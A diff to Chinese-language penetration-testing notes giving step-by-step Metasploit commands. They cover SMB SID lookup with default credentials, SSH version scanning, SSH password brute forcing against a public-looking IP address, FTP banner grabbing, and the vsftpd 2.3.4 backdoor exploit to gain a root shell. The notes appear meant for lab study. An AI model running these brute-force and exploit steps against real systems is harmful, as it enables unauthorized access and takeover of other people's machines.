@@ -1,3 +1,5 @@
+arp tcp smb ssh
+
 获取主机信息，系统用户信息，进程信息
 使用metaspoit的nmap和arp_sweep
 
@@ -86,6 +88,86 @@ msf6 auxiliary(scanner/smb/smb_lookupsid) > set RHOST 192.168.1.180
 msf6 auxiliary(scanner/smb/smb_lookupsid) > set SMBUser administrator
 msf6 auxiliary(scanner/smb/smb_lookupsid) > set SMBPass 123456
 msf6 auxiliary(scanner/smb/smb_lookupsid) > run
+
+
+########————》基于ssh协议收集信息
+查看ssh的版本信息
+ssh_version
+msf6 > search ssh_version
+msf6 > use auxiliary/scanner/ssh/ssh_version
+msf6 auxiliary(scanner/ssh/ssh_version) > show options
+msf6 auxiliary(scanner/ssh/ssh_version) > set RHOSTS 192.168.1.180
+msf6 auxiliary(scanner/ssh/ssh_version) > run
+
+ssh暴力破解
+ssh_login
+自带密码字典
+cat /usr/share/metasploit-framework/data/wordlists/root_userpass.txt
+
+msf6 > search ssh_login
+msf6 > use auxiliary/scanner/ssh/ssh_login
+msf6 auxiliary(scanner/ssh/ssh_login) > show options
+msf6 auxiliary(scanner/ssh/ssh_login) > set RHOSTS 47.112.144.203
+msf6 auxiliary(scanner/ssh/ssh_login) > set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txt
+msf6 auxiliary(scanner/ssh/ssh_login) > set VERBOSE true
+显示爆破过程
+msf6 auxiliary(scanner/ssh/ssh_login) > run
+msf6 auxiliary(scanner/ssh/ssh_login) > sessions
+查看会话
+msf6 auxiliary(scanner/ssh/ssh_login) > sessions -i 1
+启动进程
+破解成功后，会创建会话；进入会话后就能操纵靶机
+
+
+#########————》基于FTP协议
+1.查看ftp的版本信息
+ftp_version
+
+msf6 > search ftp_version
+msf6 > use auxiliary/scanner/ftp/ftp_version
+msf6 auxiliary(scanner/ftp/ftp_version) > show options
+msf6 auxiliary(scanner/ftp/ftp_version) > set RHOSTS 10.211.55.6
+msf6 auxiliary(scanner/ftp/ftp_version) > run
+[+] 10.211.55.6:21        - FTP Banner: '220 kali-linux-2021-3.localdomain FTP server (Version 6.4/OpenBSD/Linux-ftpd-0.17) ready.\x0d\x0a'
+[*] 10.211.55.6:21        - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+FTP版本信息为FTP server (Version 6.4/OpenBSD/Linux-ftpd-0.17)
+msf6 auxiliary(scanner/ftp/ftp_version) > back
+
+msf6 > search 2.3.4
+ftp的2.3.4版本有root后门，其他版本好像没有
+msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 10.211.55.6
+RHOSTS => 10.211.55.6
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run
+成功后会建立session，回车后进入靶机，并获得root权限
+
+#######——》FTP匿名登录扫描
+anonymous匿名扫描
+实现功能：针对2.3.4版本的ftp，可以匿名访问
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
